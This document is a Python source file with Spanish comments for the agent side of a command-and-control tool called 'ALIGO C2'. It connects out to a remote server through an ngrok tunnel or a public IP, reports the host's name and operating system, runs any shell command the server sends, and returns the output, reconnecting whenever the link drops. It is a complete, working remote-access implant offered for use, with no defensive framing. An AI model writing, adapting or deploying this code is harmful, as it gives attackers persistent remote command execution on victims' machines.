"""
Agente C2 - Versión para ngrok/Internet
CONFIGURADO PARA: Conectarse a servidor via ngrok o IP pública

USO:
    python3 agent_ngrok.py 4.tcp.ngrok.io 15432
    python3 agent_ngrok.py servidor.ejemplo.com 4444
"""

import socket
import json
import subprocess
import platform
import uuid
import time
import sys

# ============================================
# CONFIGURACIÓN FLEXIBLE
# ============================================

# Valores por defecto (cambiar según tu servidor)
DEFAULT_HOST = "4.tcp.ngrok.io"  # Cambia esto con tu URL de ngrok
DEFAULT_PORT = 4444

# Si se pasan argumentos de línea de comandos, usarlos
if len(sys.argv) >= 3:
    SERVER_HOST = sys.argv[1]
    SERVER_PORT = int(sys.argv[2])
elif len(sys.argv) == 2:
    SERVER_HOST = sys.argv[1]
    SERVER_PORT = DEFAULT_PORT
else:
    SERVER_HOST = DEFAULT_HOST
    SERVER_PORT = DEFAULT_PORT

AGENT_ID = "agent-" + str(uuid.uuid4())[:6]
RECONNECT_DELAY = 5  # segundos antes de reintentar si se cae la conexión


def send_json(sock, data: dict):
    msg = json.dumps(data) + "\n"
    sock.sendall(msg.encode())


def recv_json(sock, buffer: str):
    while "\n" not in buffer:
        chunk = sock.recv(4096)
        if not chunk:
            return None, buffer
        buffer += chunk.decode(errors="ignore")
    line, buffer = buffer.split("\n", 1)
    if not line.strip():
        return {}, buffer
    return json.loads(line), buffer


def execute_command(command: str) -> str:
    """Ejecuta un comando del sistema y captura su salida."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
        )
        output = result.stdout if result.stdout else result.stderr
        return output.strip() or "(sin salida)"
    except subprocess.TimeoutExpired:
        return "(error) comando excedió el tiempo límite"
    except Exception as e:
        return f"(error) {e}"


def run_agent():
    print(f"[*] Agente ID: {AGENT_ID}")
    print(f"[*] Intentando conectar a {SERVER_HOST}:{SERVER_PORT}")
    print(f"[*] Presiona Ctrl+C para detener")
    print()
    
    while True:  # loop de reconexión
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)  # timeout de 10 segundos para conectar
            sock.connect((SERVER_HOST, SERVER_PORT))
            sock.settimeout(None)  # quitar timeout después de conectar
            
            print(f"[+] ✅ Conectado al servidor como {AGENT_ID}")

            # Registro inicial
            send_json(sock, {
                "type": "hello",
                "agent_id": AGENT_ID,
                "hostname": platform.node(),
                "os": platform.system(),
            })

            buffer = ""
            while True:
                msg, buffer = recv_json(sock, buffer)
                if msg is None:
                    print("[!] Servidor cerró la conexión")
                    break
                if msg.get("type") == "cmd":
                    cmd = msg.get("command")
                    msg_id = msg.get("id")
                    print(f"[cmd recibido] id={msg_id}: {cmd}")
                    output = execute_command(cmd)
                    send_json(sock, {
                        "type": "result",
                        "id": msg_id,
                        "agent_id": AGENT_ID,
                        "output": output,
                        "status": "ok",
                    })
                    print(f"[resultado enviado] id={msg_id}")

        except socket.timeout:
            print(f"[!] Timeout al conectar a {SERVER_HOST}:{SERVER_PORT}")
            print(f"[*] ¿Está el servidor corriendo? ¿Es correcta la dirección?")
            print(f"[*] Reintentando en {RECONNECT_DELAY}s...")
            time.sleep(RECONNECT_DELAY)
        except socket.gaierror:
            print(f"[!] No se pudo resolver el hostname: {SERVER_HOST}")
            print(f"[*] Verifica que la URL sea correcta")
            print(f"[*] Reintentando en {RECONNECT_DELAY}s...")
            time.sleep(RECONNECT_DELAY)
        except (ConnectionRefusedError, ConnectionResetError, OSError) as e:
            print(f"[!] Error de conexión: {e}")
            print(f"[*] Reintentando en {RECONNECT_DELAY}s...")
            time.sleep(RECONNECT_DELAY)
        except KeyboardInterrupt:
            print("\n[*] Agente detenido por el usuario")
            sys.exit(0)


if __name__ == "__main__":
    print("=" * 50)
    print("  ALIGO C2 - Agente")
    print("=" * 50)
    print()
    
    if len(sys.argv) > 1:
        print("[i] Usando configuración de línea de comandos")
    else:
        print("[i] Usando configuración por defecto")
        print(f"[i] Puedes especificar: python3 {sys.argv[0]} <host> <puerto>")
    
    print()
    run_agent()
